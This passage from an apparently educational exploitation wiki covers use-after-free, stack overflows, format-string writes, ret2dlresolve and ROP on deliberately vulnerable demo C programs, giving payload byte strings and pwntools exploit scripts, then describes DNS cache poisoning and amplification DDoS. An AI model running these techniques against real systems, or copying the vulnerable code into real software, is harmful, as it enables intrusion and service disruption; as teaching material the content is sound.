<p>When a heap chunk is freed, if a new chunk of the exactly same size is requested in a reasonable time-frame, <code>malloc</code> will return a pointer to that original freed chunk. Most of the data that was present in this chunk will then still remain intact and could corrupt the new chunk. </p>
<p>What we need is to set the <code>IsEnabled</code> member of the service to 1. Putting the code under scrutiny, we realise that we can freely control the <code>IsLoggedIn</code> member of the user through the <code>login</code> command. Furthermore, we can actually <em>delete</em> a user by invoking <code>logout</code>. Hmm... the <code>Service</code> and <code>User</code> structs have the same size... I wonder what would happen if I were to create a service right after I have logged out of a user. Well, let's find out!</p>
<p><img src="Exploitation/Binary%20Exploitation/Heap%20Exploitation/Resources/Source%20Files/UAF_pwn.png" alt="" /></p>
<p>Well, well, well, would you look at that! The service was successfully executed. But what happened?</p>
<p>We first created a user with <code>register</code>. Upon logging into the user with <code>login</code>, the <code>IsLoggedIn</code> member was set to 1. With <code>logout</code>, the user was deleted and the chunk on the heap was freed. However, the chunk data isn't completely overwritten (only the <code>fwd</code> and <code>bwd</code> pointers are). Consequently, the location where <code>IsLoggedIn</code> was stored on the heap still contains a 1. When we call <code>service</code>, memory was requested from the heap. Since the size was the same as the size before, <code>malloc</code> returned the chunk where the <code>User</code> struct was previously stored. Ergo, the <code>IsEnabled</code> member is actually stored at the same memory where <code>IsLoggedIn</code> was. However, we already put a 1 into that memory with <code>login</code>. Ergo, <code>IsEnabled</code> is set to 1 and the service is executed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stack-exploitation"><a class="header" href="#stack-exploitation">Stack Exploitation</a></h1>
<p>Stack exploitation is the art of corrupting stack memory in order to alter a programme's behaviour in a malicious manner. This chapter assumes prior knowledge of the stack which is covered by <a href="Exploitation/Binary%20Exploitation/Stack%20Exploitation/../../../Reverse%20Engineering/Program%20Anatomy/The%20Stack.html">this Cyberclopaedia article</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-6"><a class="header" href="#introduction-6">Introduction</a></h1>
<p>An essential memory structure in many programmes is the buffer. It is simply a container for information - an array. This in itself is no threat to the programme, however, certain functions which deal with buffers are unsafe. Functions that write to buffers may <em>overflow</em> the buffer - that is, write to memory outside of the buffer, since the function usually doesn't have a way to infer the size of the buffer and therefore stop once it reaches it. Moreover, even a function is provided with a size up to which to write and then cease execution, this can still result in a buffer overflow, if there is a mismatch between the given and actual size of the buffer.</p>
<p>Buffer overflows are one of the most common vulnerabilities and can be especially dangerous if they happen on the stack, since they typically allow for easy code execution. This happens when writing outside the buffer and overwriting the procedure's return address.</p>
<p>Generally, any function which deals with buffers should be considered unsafe and scrutinised when looking for holes in a binary. That being said, there are certain functions which are appalling and you should <em>never</em> use them in your code, since they don't even take in a buffer size, but rather just do their work indefinitely or until some condition is satisfied (such as reaching a null-byte). These include <code>gets</code>, <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>, and more.</p>
<h1 id="exploiting-a-buffer-overflow"><a class="header" href="#exploiting-a-buffer-overflow">Exploiting a Buffer Overflow</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;

void win()
{
	printf(&quot;Pwned!\n&quot;);
}

void vuln()
{
	char buffer[32];
	fgets(&amp;buffer, 0x32, stdin);
}

int main()
{
	vuln();
}
</code></pre>
<p>To illustrate that even functions which take a size can still be dangerous when dealing with buffers, I have chosen the <code>fgets</code> function. If you don't have an attentive eye, you might tell yourself &quot;But what's the matter? The size which <code>fgets</code> takes matches the actual size of the buffer, so no vulnerability here.&quot; Not so fast. Upon taking a closer look, you see that the size in <code>fgets</code> is actually <code>0x32</code>. The <code>0x</code> means that this is a hexadecimal number and <code>0x32</code> in hex is actually equal to <code>50</code> in decimal which is 18 bytes more that 32. Consequently, there is a buffer overflow.</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_fgets_stack.png" alt="" /></p>
<p><code>fgets</code> begins writing data at the start of the buffer and continues upwards. Given enough data to write, it will eventually reach and overwrite the return address, resulting in code execution when the <code>vuln</code> function returns. We now need two things to exploit the vulnerability - the address of the <code>win</code> function, which is fairly easy to get given disabled ASLR and <code>gdb</code>, and the offset from the beginning of the buffer at which <code>vuln</code>'s return address is stored. Note that this is rarely just the size of the buffer, since other stuff may precede our buffer on the stack.</p>
<h2 id="using-de-brujin-sequences-to-identify-the-offset"><a class="header" href="#using-de-brujin-sequences-to-identify-the-offset">Using De Brujin sequences to identify the offset</a></h2>
<p>A De Brujin sequence of order <code>n</code> is simply a sequence of characters in which every possible substring of size <code>n</code> occurs exactly once. A more mathematically rigorous explanation you can find at https://en.wikipedia.org/wiki/De_Bruijn_sequence.</p>
<p>De Brujin sequences are very powerful, since we can generate such a string and pass it as input to the programme. When the return address is overwritten, it will contain garbage (the sequence of characters inside of it may look like <code>aaaaaaab</code>, which is most likely an invalid return location) and so the programme will crash. Once it crashes, we can inspect the return address with a debugger and look up its position in the original sequence. This, therefore, provides us with the offset.</p>
<p><code>gef</code>, a <code>gdb</code> extension, provides useful tools exactly for this purpose. You can generate a pattern with 
<code>pattern create --period [order] [length]</code></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_gef_pattern_create.png" alt="" /></p>
<p>Pass this sequence as input to the programme and observe the return address when it crashes:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_ret_addr_crash.png" alt="" /></p>
<p>Look at what <code>\\( rsp</code> points to - <code>faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala</code>. We can search for this string in the original pattern like so:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_gef_pattern_search.png" alt="" /></p>
<p>Bingo, the return address is stored at offset <code>40 - 1</code> from the beginning of <code>buffer</code>. Ergo, before writing the address of <code>win</code>, 39 characters are needed. You might notice that this is according to big-endian search, but my architecture is actually little-endian. Why does this work then? Honestly, I have no clue. Perhaps it's a visual bug with <code>gef</code>, since if you look at their documentation, <code>pattern search</code> is actually supposed to output two outputs - one for a little-endian and one for a big-endian search.</p>
<h2 id="finding-the-address-of-win"><a class="header" href="#finding-the-address-of-win">Finding the address of <code>win</code></a></h2>
<p>For the sake of simplicity, I have disabled ASLR, meaning we can just grab the address through <code>gdb</code>. This turns out to be <code>0x5555555551a9</code>.</p>
<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
<p>With this information, we can exploit the buffer overflow:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_pwn.png" alt="" /></p>
<h2 id="shellcode-attacks"><a class="header" href="#shellcode-attacks">Shellcode Attacks</a></h2>
<p>When a binary is compiled with NX disabled, it means that instructions can be executed directly off the stack. This means that an adversary may write to the stack the assembly instructions they want to be executed in the form of bytes and then take advantage of some code redirection technique (such as the buffer overflow described above) in order to point the instruction pointer to the beginning of their malicious code. The bytes that they inject onto the stack are referred to as <em>shellcode</em>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-7"><a class="header" href="#introduction-7">Introduction</a></h1>
<p>The C language provides certain functionality for converting variables into human-readable strings. This can be seen in functions like <code>printf</code>. For example, the following code will combine the string <code>&quot;Printing the magic number... The magic number is &quot;</code> with the number stored in <code>a</code>.</p>
<pre><code class="language-cpp">int a = 2;
printf(&quot;Printing the magic number... The magic number is %d\n.&quot;, &amp;a);
</code></pre>
<p>The first argument is called the format string and <code>%d</code> is known as a format parameter. When using a variable as a format argument, you need to pass its address. There also exist multiple format parameters:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Parameter</th><th style="text-align: left">Meaning</th><th style="text-align: center">Passed as</th></tr></thead><tbody>
<tr><td style="text-align: center">%p</td><td style="text-align: left">Prints the argument as a pointer</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%%</td><td style="text-align: left">Prints a % character</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%d</td><td style="text-align: left">Prints a signed decimal number</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%u</td><td style="text-align: left">Prints an unsigned decimal number</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%x</td><td style="text-align: left">Prints the argument as a hexadecimal number</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%s</td><td style="text-align: left">Prints a string</td><td style="text-align: center">Pointer</td></tr>
<tr><td style="text-align: center">%n</td><td style="text-align: left">Prints nothing, but stores the number of bytes written so far in the location specified by the pointer passed as an argument</td><td style="text-align: center">Pointer</td></tr>
</tbody></table>
</div>
<p>When <code>printf</code> is invoked, it goes backwards from the beginning of its stack frame through the stack in order to retrieve its arguments one by one. If a format string is specified but no actual arguments are pushed to the stack before the function is invoked, for every format parameter <code>printf</code> will go backwards through the stack. This will lead to the erroneous interpretation of stack memory and can lead to memory leaks. Furthermore, the <code>%n</code> format parameter can be utilised for writing arbitrary memory by manipulating the pointer into which it should store the number of bytes written so far. Consequently, format string vulnerabilities can beget arbitrary code execution by overwriting the GOT.</p>
<h1 id="the-essence-of-a-format-string-vulnerability"><a class="header" href="#the-essence-of-a-format-string-vulnerability">The Essence of a Format String Vulnerability</a></h1>
<p>Format string vulnerabilities occur when the format string of a function such as <code>printf</code> is passed directly as a buffer which can be manipulated by an attacker. The buffer itself may contain format characters which can be abused in arbitrary ways.</p>
<pre><code class="language-cpp">char input[100];
scanf(&quot;%100s&quot;, input);

printf(input);
</code></pre>
<p>This code is abominable, since the <code>input</code> buffer is entirely controlled by the user. If any format parameters are included in the buffer, <code>printf</code> will treat them accordingly and this can result in all sorts of mishaps. The correct way to implement such code is to actually pass the user input as a format argument to a format string in <code>printf</code>:</p>
<pre><code class="language-cpp">char input[100];
scanf(&quot;%100s&quot;, input);

printf(&quot;%100s&quot;, input);
</code></pre>
<h2 id="leaking-memory"><a class="header" href="#leaking-memory">Leaking Memory</a></h2>
<p>Format string vulnerabilities can be easily exploited to leak memory on the stack. This is typically done through the use of the <code>%p</code> or <code>%x</code> format parameters. Filling a format string with those parameters will continuously leak stack memory. Sometimes, however, the buffer we are writing to doesn't have enough space to store enough parameters for us to reach the value we want to leak. Luckily, C has some syntax sugar which allows us to retrieve a particular argument. This is done by using <code>%n\\( parameter</code>, where <code>n</code> is the number of the argument we want to access and <code>parameter</code> is the format parameter we want to use. Consequently, if we want to print the third value on the stack as a pointer, we would use <code>%n \\)p</code>.</p>
<p>Here is a simple example of such an attack.</p>
<p>leaking_memory.c:</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(void)
{

int input = 0;
int key = 0xdeadbeef;
char message[100];

printf(&quot;Enter a message to be sent:\n&quot;);

fgets(message, sizeof(message), stdin);

printf(&quot;The following message will be sent: \n&quot;);
printf(message);

printf(&quot;Enter the secret key in order to send the message. \n&quot;);
scanf(&quot;%d&quot;, &amp;input);

if (input == key)
{
	printf(&quot;Message successfully sent!\n&quot;);
}
else
{
	printf(&quot;Failed to send message!\n&quot;);
}


return 0;
}
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_leak.png" alt="" /></p>
<h2 id="writing-arbitrary-memory"><a class="header" href="#writing-arbitrary-memory">Writing Arbitrary memory</a></h2>
<p>The <code>%n</code> format parameter can be used to write to arbitrary memory. Recall that it takes a pointer a pointer as its argument, but where does it get this pointer from? Well, just as any other argument, this pointer is retrieved from the stack. But wait a minute... In i386 and amd64 function arguments are pushed to the stack before a procedure is invoked. Consequently, we can write any value to the stack by including it in the format string, navigating to this value with <code>%x</code> or <code>%p</code> and then just put a <code>%n</code> to treat this value as a location and write to it. As a shortcut, we can use the <code>%parameter\\( n</code>  to choose a particular value on the stack to treat as a pointer. </p>
<p>However, writing a large value would require a lot of characters before <code>%n</code>. Luckily, we can print those with a shortcut. Before <code>%n</code> we need to insert <code>%&lt;value&gt;x</code> and this will write <code>value</code> characters to the screen.</p>
<p>writing_memory.c:</p>
<pre><code class="language-cpp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target = 0xdeadbeef;

int main(int argc, char *argv[])
{
	char buffer[64];

    fgets(buffer, 64, stdin);
    printf(buffer);

    if(target == 0xdeadc0de) 
    {
      	printf(&quot;Pwned!\n&quot;);
    	return EXIT_SUCCESS;
	} 
	else 
	{
  	  	printf(&quot;Try again.\n&quot;);
  	  	exit(EXIT_FAILURE);
  	}
}
</code></pre>
<p>Upon looking at this code, we immediately notice the potential for a format string vulnerability. We need to somehow overwrite the <code>target</code> variable and change its value to <code>0xdeadc0de</code>. This can be done through <code>%n</code>, but requires the address of <code>target</code>. You might need to use some type of leak to do this, but as an example I will use gdb, which on my machine tells me that <code>target</code> is located at <code>0x555555558048</code>. </p>
<p>Since this address will be included in the format string, the location of the beginning of the format string on the stack must be found. This can be done through some light fuzzing by putting, for example, a string of <code>A</code>s in the beginning and then following it up with <code>%x</code>s until the repeating <code>A</code>s are reached. The final cound to <code>%x</code> that have been used is the number of the argument. </p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_writing_arg_fuzz.png" alt="" /></p>
<p>Consequently, the beginning would be the 8th argument. Consequently, it is possible to calculate the argument number for the address included in the string.</p>
<p>We now have the address we want to write to, all that is needed is to set up the value we want to write. This means that we have to find a way to print a number of <code>0xdeadc0de</code> bytes before <code>%n</code>. One would be crazy for thinking that <em>actually</em> inserting so many bytes into the buffer is even possible. The trick here is to use specify the number of characters we want to pad <code>%n</code> with by using <code>%x</code> like so - <code>%&lt;padding&gt;x%&lt;argument&gt; \\)n</code>. Even still, the value is too large to be printed in a reasonable time. Here we are allowed to buck the system by splitting the value at the middle like so <code>dead</code> and <code>c0de</code> and just writing two short integers rather than one huge integer. Ergo, <code>0xdead</code> should be written at <code>0x555555558048 + 2 = 0x55555555804a</code>, whereas <code>0xc0de</code> should be placed at <code>0x555555558048</code>.</p>
<p>The amount of padding is given by the following formula:
<code>&lt;The value needed&gt; - &lt;Bytes already written&gt;</code></p>
<p>It is now possible to proceed. Let's commence with the least significant bytes - <code>0xc0de</code> (49374 in decimal). It is best if the address where we want to write to is put at the <em>end</em> of the string, since the internal stack pointer of <code>printf</code> only works with 8-byte displacements and, consequently, any address must have its leading <code>0</code>s until it takes up the entire 8 bytes. Additionally, a certain number of non-zero bytes may need to be inserted before the address in the format string for further alignment purposes.</p>
<p>To simplify matters here, both <code>0xdeadc0de</code> and <code>0xdeadbeef</code> begin with the same bytes, so we need only overwrite the last ones. If that were not the case, one would simply have to chain multiple paddings with multiple <code>%n</code> format parameters. Therefore, our format string should be the following:</p>
<p><code>&quot;%49374x%&lt;argument&gt;\\( n&lt;padding bytes&gt;&lt;zero-extended address&gt;&quot;</code></p>
<p>The <code>argument</code> number may from system to system and you have to either bruteforce it or calculate it using a debugger like gdb. I have calculated it be 10. You may need further padding bytes and the number of bytes has to either again be bruteforced or calculated. Any addresses to write to should be placed at the end of the string to avoid premature null-termination. Our final string looks like this:</p>
<p><code>&quot;%49374x%10 \\)hnAAA\x48\x80\x55\x55\x55\x55\x00\x00&quot;</code></p>
<p>The <code>h</code> before the <code>n</code> just tells <code>printf</code> to write a <code>short</code> instead of an <code>int</code> (Remember that we are only overwriting the last two bytes).</p>
<p><em>Note: You might be tempted to just print this string with python and pipe it into the program, but that's an appalling approach since the address may contain weird bytes that are outside the range of ASCII and this will result in errors. This can be bypassed by writing the exact bytes to a blank binary file and just piping the file instead of the python output. You might have to do this manually through a hex editor</em>.</p>
<p>I have now created a file called <code>input</code> which contains the following bytes:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_input_file.png" alt="" /></p>
<p>Piping this file into the programme results in the overwriting of the <code>target</code> variable!</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_write_pipe.png" alt="" /></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_write_pwn.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-8"><a class="header" href="#introduction-8">Introduction</a></h1>
<p>This is a highly sophisticated attack which leverages the way dynamic library functions are resolved at runtime in order to resolve an arbitrary procedure and invoke it.</p>
<p>To understand the following content, knowledge of <a href="Exploitation/Binary%20Exploitation/Stack%20Exploitation/../../../Reverse%20Engineering/Binary%20Formats/ELF/Dynamic%20Linking.html">dynamic linking</a> with ELF files is necessary.</p>
<h1 id="theory"><a class="header" href="#theory">Theory</a></h1>
<p>It is possible to use <code>_dl_resolve</code> to call any external function by creating a fake relocation table, symbol table, string table, and GOT. <code>_dl_resolve</code> performs no upper boundary checks on the relocation argument, which means that we can make it arbitrarily large and thus point it to our fake relocation table. From there, we can do the same with the rest of the offsets. It does, however, check a few other things which we will need to work around.</p>
<p>Because of the checks that <code>_dl_resolve</code> performs, the <code>r_info</code> must be divisible by 0x18. The distance between the real symbol table and our fake one must be divisible by 0x18 and fit in 32 bits after this division. This practically prevents us from using the stack on 64-bit systems to store our fake tables and we will need to utilise the <code>.bss</code> section, which is closer to the real symbol table in the executable. Additionally, <code>r_info</code> must end in 0x7.</p>
<p>For the sake of simplicity, all of the fake tables will only contain one entry. Once we have the fake symbol table set up, we need to set <code>st_other</code> to 0 and <code>st_name</code> to the distance between the real string table and our fake one, which can in this case be a single null-terminated string. Next, <code>r_info</code> must be populated with <code>(( RealToFakeSymbolTableOffset / 0x18 ) &lt;&lt; 32 ) | 0x7</code>, where <code>RealToFakeSymbolTableOffset</code> is the 0x18 aligned distance between our fake and real symbol tables. Do not worry about all the bit-wise operations - these are taken care of by a few macros in <code>_dl_resolve</code>. <code>r_offset</code> on the other hand, must contain the distance between our fake global offset table and the ELF header.</p>
<p>The relocation argument should store the offset between the start of the real relocation table and the beginning of the fake relocation table divided by the size of one relocation entry and should be put at the top of the stack. Consequently, if gaining code execution through a stack buffer overflow, the relocation argument should follow the malicious return address.</p>
<h1 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

char message[128];

void SendMessage()
{
	char sender[20];
	
	printf(&quot;Enter the message: \n&quot;);
	fgets(message, 128, stdin);
	
	printf(&quot;Enter the sender name: \n&quot;);
	fgets(sender, 0x40, stdin);
}

int main()
{
	SendMessage();		
	printf(&quot;Message sent!&quot;);
	return 0;
	
}
</code></pre>
<p>Manually performing this exploit can be rather extremely cumbersome. Anyway, the fake tables should be set in the following way:</p>
<p>Relocation argument:</p>
<ul>
<li>
<p><code>reloc_arg = (FakeRelocationTable - RealRelocationTable) / sizeof(Relocation Entry)</code></p>
</li>
<li>
<p>must be divisible by the size of the relocation entry:</p>
<ul>
<li><code>Elf32_Rel</code> : 8 bytes</li>
<li><code>Elf32_Rela</code>: 12 bytes</li>
<li><code>Elf64_Rel</code>: 16 bytes</li>
<li><code>Elf64_Rela</code>: 24 bytes</li>
</ul>
</li>
</ul>
<p>Fake relocation table:</p>
<ul>
<li><code>r_offset = FakeGOT - ElfHeader</code></li>
<li><code>[+0x8] r_info = (( (FakeSymbolTable - RealSymbolTable) / 0x18 ) &lt;&lt; 32 ) | 0x7</code>
<ul>
<li>the distance between the fake and the real symbol table must be divisible by 0x18, so padding might be required</li>
</ul>
</li>
<li><code>[+0x10] r_addend = 0 (doesn't matter)</code></li>
</ul>
<p>Fake symbol table:</p>
<ul>
<li><code>[+0x18] st_name = FakeStringTable - RealStringTable</code></li>
<li><code>[+0x20] st_info = 0 (doesn't matter)</code></li>
<li><code>[+0x21] st_other = 0</code></li>
</ul>
<p>Fake string table:</p>
<ul>
<li><code>[+0x22] function name = system\x00 (or any other function)</code></li>
</ul>
<p>The above offsets are from the beginning of the fake relocation table and are suited to x64. You will have to change them for x86 based on the size of the struct fields.</p>
<p>For any arguments you want to pass to the function, you will either need to use shellcode in your initial payload buffer or utilise ROP.</p>
<p>Consequently, the payload for the <code>message</code> is
<code>&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x99\x40\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x88\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\xda\x3b\x00\x00\x00\x00\x00\x00\x00\x00abort\x00&quot;</code></p>
<p>The actual buffer that will be overflowed is the <code>sender</code> buffer the payload for it looks like this:
<code>&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x30\x50\x55\x55\x55\x55\x00\x00\x6d\x02\x00\x00\x00\x00\x00\x00&quot;</code>
The last bytes are the value of the relocation argument and the ones before are the address of PLT0.</p>
<p>Indeed, running this exploit results in the programme's abortion through the <code>abort</code> function (you can check by the exit code).</p>
<pre><code class="language-python">from pwn import *

program = process(&quot;./dl_resolve&quot;)

print(program.recvlineS())
program.sendline(b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x99\x40\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x88\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\xda\x3b\x00\x00\x00\x00\x00\x00\x00\x00abort\x00&quot;)

print(program.recvlineS())
program.sendline(b&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x30\x50\x55\x55\x55\x55\x00\x00\x6d\x02\x00\x00\x00\x00\x00\x00&quot;)

program.interactive()
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/RDLR_manual.png" alt="" /></p>
<p>The <code>abort</code> procedure takes no arguments which made manual exploitation easier, however, when you want to invoke a function with parameters, such as <code>system</code>, you will need to either execute additional shellcode before jumping to PLT0, or build a ROP chain.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-9"><a class="header" href="#introduction-9">Introduction</a></h1>
<p>Return-oriented programming is a set of techniques which allow code execution and bypass data execution prevention defences, such as NX, and code signing. ROP utilises <em>gadgets</em> in order to build chains and execute arbitrary instruction sequences.</p>
<p>Given control over the stack, an attacker may fill it with malicious return addresses, all pointing to the subsequent gadget in the ROP chain. When one gadget is executed, the <code>ret</code> instruction jumps to the address stored at the top of the stack and the stack pointer is incremented. Consequently, the stack pointer now points to the next malicious return address, forming a chain of gadgets.</p>
<h1 id="gadgets"><a class="header" href="#gadgets">Gadgets</a></h1>
<p>ROP gadgets are tiny instruction sequences which are already found in the target binary and end in a <code>ret</code> instruction. To manually find them within a binary, one might use a tool called <code>ROPgadget</code> with the following basic syntax:</p>
<p><code>ROPgadget --binary [binary name]</code></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_ropgadget.png" alt="" /></p>
<p>(This is just a small portion of the output.)</p>
<h1 id="exploitation-2"><a class="header" href="#exploitation-2">Exploitation</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void func()
{
	system(&quot;echo 'An inconspicuous echo...'&quot;);
}

void vuln()
{
	char input[20];
	fgets(input, 0x60, stdin);
}

int main()
{
	char* HarmlessString = &quot;echo pwn&quot;;
	vuln();
	func();
	return 0;

}
</code></pre>
<p>We immediately notice a potential buffer overflow. Since <code>system</code> is called in the execution process of the binary, it will have a corresponding PLT entry. Furthermore, the string <code>&quot;/bin/sh&quot;</code> has been conveniently place in the binary - If we had the proper gadgets, we could string together a ROP chain, allowing us to execute <code>system(&quot;/bin/sh&quot;)</code>. Well, let's start digging.</p>
<p>Running ROPgadgets on the above binary reveals a way to write to <code>rdi</code>!
<code>0x000000000000126b : pop rdi ; ret</code></p>
<p>Consequently, we can just write the address of the <code>&quot;/bin/sh&quot;</code> string in the binary, place it on the stack and, when the time comes, <code>rdi</code> will be populated with this address. All we will then need to do is return to the PLT entry of <code>system</code>, so that the function is invoked with the correct argument!</p>
<p>The addresses we need turn out to be:</p>
<p><code>0x555555555040</code> - PLT entry of <code>system</code>
<code>0x55555555526b</code> - <code>pop rdi; ret</code> gadget
<code>0x555555556028</code> - <code>&quot;/bin/sh&quot;</code>
<code>0x5555555551ff</code> - the address we want to continue execution from once the ROP chain is finished</p>
<p>Knowing that we need exactly 40 character to overflow the return address of <code>vuln</code>, we get the following payload.</p>
<p><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x6b\x52\x55\x55\x55\x55\x00\x00\x28\x60\x55\x55\x55\x55\x00\x00\x40\x50\x55\x55\x55\x55\x00\x00\xff\x51\x55\x55\x55\x55\x00\x00</code></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual.png" alt="" /></p>
<p>Input file:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual_input.png" alt="" /></p>
<p>And... exploit!</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual_exp.png" alt="" /></p>
<h1 id="exploiting-with-pwntools"><a class="header" href="#exploiting-with-pwntools">Exploiting with pwntools</a></h1>
<p><code>pwntools</code> comes with tools for automating the process of finding gadgets and stringing them into chains for exploitation.</p>
<p>You will first need to load the ELF executable and specify its base address:</p>
<pre><code class="language-python">elf = ELF('./rop')
elf.address = 0x555555554000
</code></pre>
<p>Subsequently, initialise a ROP object:</p>
<pre><code class="language-python">rop = ROP(elf)
</code></pre>
<h2 id="pwntools-rop-commands"><a class="header" href="#pwntools-rop-commands">Pwntools ROP commands</a></h2>
<p>Get a dictionary of available gadgets:</p>
<pre><code class="language-python">rop.gadgets
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_gadgets.png" alt="" /></p>
<p>Insert raw bytes into the chain:</p>
<pre><code class="language-python">rop.raw(bytes)
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_raw.png" alt="" /></p>
<p>Call functions:</p>
<pre><code class="language-python">rop.call(symbol, [arguments])
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_call.png" alt="" /></p>
<p>Get chain as bytes:</p>
<pre><code class="language-python">rop.chain()
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_chain_bytes.png" alt="" /></p>
<h2 id="the-exploit"><a class="header" href="#the-exploit">The Exploit</a></h2>
<p>Using the above cheatsheet, we arrive at the following python script for exploitation:</p>
<pre><code class="language-python">#!/usr/bin/python3

from pwn import *

context.clear(arch='amd64')
elf = ELF('./rop')
elf.address = 0x555555554000

rop = ROP(elf)
rop.call(elf.symbols['system'], [next(elf.search(b&quot;echo pwn\x00&quot;))])

prog = process('./rop')

payload = [b&quot;A&quot;*40, rop.chain()]
payload = b&quot;&quot;.join(payload)

prog.sendline(payload)
prog.interactive()

</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_success.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">DNS</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-10"><a class="header" href="#introduction-10">Introduction</a></h1>
<p>A flaw of all DNS name servers is that if they contain incorrect information, they may spread it to clients or other name servers. Each DNS name server (even individual clients) has a DNS cache. The system stores there information about any responses it gets for domains it requested. An attacker could inject false entries in this cache and as such, any computer which queries the poisoned name server will receive false results. This is known as <em>DNS cache poisoning</em>. </p>
<p>The attack can be used to redirect users to a different website than the requested one. As such, it opens opportunities for phishing attacks by creating evil twins of login portals for well-known sites.</p>
<p>A tool for performing such targeted attacks is <a href="https://github.com/cr0mll/deserter">deserter</a>. Usage information is available on its GitHub page.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-dns-traffic-amplification"><a class="header" href="#what-is-dns-traffic-amplification">What is DNS Traffic Amplification?</a></h1>
<p>A DNS (Traffic) Amplificaton attack is a popular form of a distributed denial of service (DDoS) attack, which abuses open DNS resolvers to flood a target system with DNS response traffic. It's called an <em>amplification</em> attack because it uses DNS responses to upscale the size of the data sent to the victim.</p>
<h1 id="how-does-it-work"><a class="header" href="#how-does-it-work">How does it work?</a></h1>
<p>An attacker sends a DNS name lookup to an open resolver with the source IP spoofed to be the victim's IP address. That way, any response traffic would be sent to the victim and not the attacker. The requests submitted by the attacker usually aim to query for as much information as possible in order to maximise the amplification effect. In most cases, the queries sent are of type <code>ANY</code> which requests all known information about a particular DNS zone. Using a botnet, it's easy to create immense amounts of traffic. It is also rather difficult to protect against these attacks because the traffic is coming from legitimate sources - real DNS servers.</p>
<h2 id="conducting-a-dns-traffic-amplification-attack"><a class="header" href="#conducting-a-dns-traffic-amplification-attack">Conducting a DNS Traffic Amplification Attack</a></h2>
<h3 id="testing-a-dns-server-for-attack-surface"><a class="header" href="#testing-a-dns-server-for-attack-surface">Testing a DNS server for attack surface</a></h3>
<p>We should first check if a DNS Traffic Amplification is possible and if it's viable. We can do this through <a href="Exploitation/DNS/">Metasploit</a> using the module <code>auxiliary/scanner/dns/dns_amp</code>.</p>
<p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp.png" alt="" /></p>
<p>In the <code>RHOSTS</code> you need to put the IP of the name server you want to test. <em>This module will tell you if a name server can be used in an amplification attack but won't actually execute the attack.</em></p>
<p>Run the scanner:</p>
<p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp-sc-run.png" alt="" /></p>
